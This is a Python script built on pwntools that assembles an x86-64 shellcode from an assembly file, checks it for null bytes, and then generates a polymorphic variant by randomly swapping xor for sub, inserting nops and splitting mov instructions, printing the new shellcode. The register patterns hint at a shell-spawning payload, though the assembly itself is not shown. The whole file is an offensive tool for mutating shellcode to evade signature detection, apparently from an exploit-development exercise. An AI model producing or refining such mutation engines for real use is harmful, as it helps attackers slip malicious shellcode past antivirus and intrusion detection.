#!/usr/bin/python3
import random
import sys
from pwn import *
import os
from colorama import Fore, Back, Style

context(os="linux", arch="amd64", log_level="error")

def bash_command(cmd):
    subprocess.Popen(['/bin/bash', '-c', cmd])

# Check if there is nullbyte : if yes exit, otherwise call the polymorphic function
def check_nullbyte():
    file = ELF("payload")
    shellcode = file.section(".text")
    nullbyte = False
    print("[+] Shellcode : ", shellcode.hex())
    for i in shellcode:
            if i == 0:
                nullbyte = True
    if nullbyte == True:
        print(Fore.RED + "[+] Shellcode of the original payload : %d bytes - Found NULL bytes" % len(shellcode))
        print(Fore.RED + "[+] Please submit a valid shellcode")
        print(Style.RESET_ALL)
    if nullbyte == False:
        print("[+] Shellcode of the original payload : payload.s")
        print("[+] Name of the payload assembled and linked : payload")
        print(Fore.GREEN + "[+] Size : %d bytes - No NULL bytes" % len(shellcode))
        print(Style.RESET_ALL)
        polymorphic_function()
        new_payload()
        clean()

# Just assemble and link the original payload
def assembler_payload():
    os.system("nasm -f elf64 payload.s")
    os.system("ld payload.o -o payload")

# Polymorphic function
# Add randomly NOP function, replace xor by sub, and can replace some mov by two instructions (mov and add)
def polymorphic_function():
    AssemblyCode = open("payload.s", 'r')
    new_payload = open("new_payload.s", 'w+')
    Lines = AssemblyCode.readlines()
    i=0
    nop1 = randint(30,45)
    nop2 = randint(20,30)
    Lines.insert((nop1), "nop \n")  
    Lines.insert((nop2), "nop \n")
    for line in Lines:
        i=i+1
        stripped_line = line.strip()
        if "xor rdx, rdx" in line:
            n = random.randint(0,1)
            if n == 1:
                line = stripped_line.replace("xor rdx, rdx", "sub rdx, rdx \n")
        if "mov bl, 0x02" in line:
            n = random.randint(0,2)
            if n == 1:
                line = stripped_line.replace("mov bl, 0x02", "mov bl, 0x01 \n")
                Lines.insert((i), "inc bl \n")
            if n == 2:
                line = stripped_line.replace("mov bl, 0x02", "mov bl, 0x01 \n")
                Lines.insert((i), "add bl, 0x01 \n")
        if "xor rax, rax" in line:
            n = random.randint(0,1)
            if n == 1:
                line = stripped_line.replace("xor rax, rax", "sub rax, rax \n")
        if "xor rbx, rbx" in line:
            n = random.randint(0,1)
            if n == 1:
                line = stripped_line.replace("xor rbx, rbx", "sub rbx, rbx \n")
        if "xor rdi, rdi" in line:
            n = random.randint(0,1)
            if n == 1:
                line = stripped_line.replace("xor rdi, rdi", "sub rdi, rdi \n")
        if "xor rcx, rcx" in line:
            n = random.randint(0,1)
            if n == 1:
                line = stripped_line.replace("xor rcx, rcx", "sub rcx, rcx \n")
        if "xor rsi, rsi" in line:
            n = random.randint(0,1)
            if n == 1:
                line = stripped_line.replace("xor rsi, rsi", "sub rsi, rsi \n")
        if "mov al, 33" in line:
            n = random.randint(0,2)
            if n == 1:
                line = stripped_line.replace("mov al, 33", "mov al, 32 \n")
                Lines.insert((i), "inc al \n")
            # Here to avoid issue with format of hex() function i just generated the first 64 hex value in the correct format
            # Indeed hex() would write the value "5" instead of "0x05" 
            if n == 0:
                n = random.randint(1,50)
                y = hexa(n)
                line = stripped_line.replace("mov al, 33", "mov al, " +  str(y) + "\n")
                r = 51-n
                r = hexa(r)
                Lines.insert((i), "add al, " + str(r)  +  "\n")
            if n == 2:
                line = stripped_line.replace("mov al, 33", "mov al, 31 \n")
                Lines.insert((i), "inc al \n")
                Lines.insert((i), "inc al \n")
        new_payload.write(line)
    new_payload.close()
    AssemblyCode.close()

# List of the first 64 values in hex format
def hexa(n):
    list_hexa = ["0x00","0x01","0x02","0x03","0x04","0x05","0x06","0x07","0x08","0x09","0x0A"
                ,"0x0B","0x0C","0x0D","0x0E","0x0F","0x10","0x11","0x12","0x13","0x14","0x15","0x16"
                ,"0x17","0x18","0x19","0x1A","0x1B","0x1C","0x1D","0x1E","0x1F","0x20","0x21","0x22"
                ,"0x23","0x24","0x25","0x26","0x27","0x28","0x29","0x2A","0x2B","0x2C","0x2D","0x2E"
                ,"0x2F","0x30","0x31","0x32","0x33","0x34","0x35","0x36","0x37","0x38","0x39","0x3A"
                ,"0x3B","0x3C","0x3D","0x3E","0x3F"]
    return list_hexa[n]

# Build the new payload modified
def new_payload():
    os.system("nasm -f elf64 new_payload.s")
    os.system("ld new_payload.o -o new_payload")
    file = ELF("new_payload")
    shellcode = file.section(".text")
    print("[+] Assembly source code of the new payload : new_payload.s")
    print("[+] New payload assembled and linked : new_payload")
    print("[+] New shellcode : ", shellcode.hex())
    print("[+] Size : %d bytes - No NULL bytes" % len(shellcode))

def clean():
    os.system("rm payload.o")
    os.system("rm new_payload.o")

print("[+] Shellcode generator - amd64 \n")
assembler_payload()
check_nullbyte()
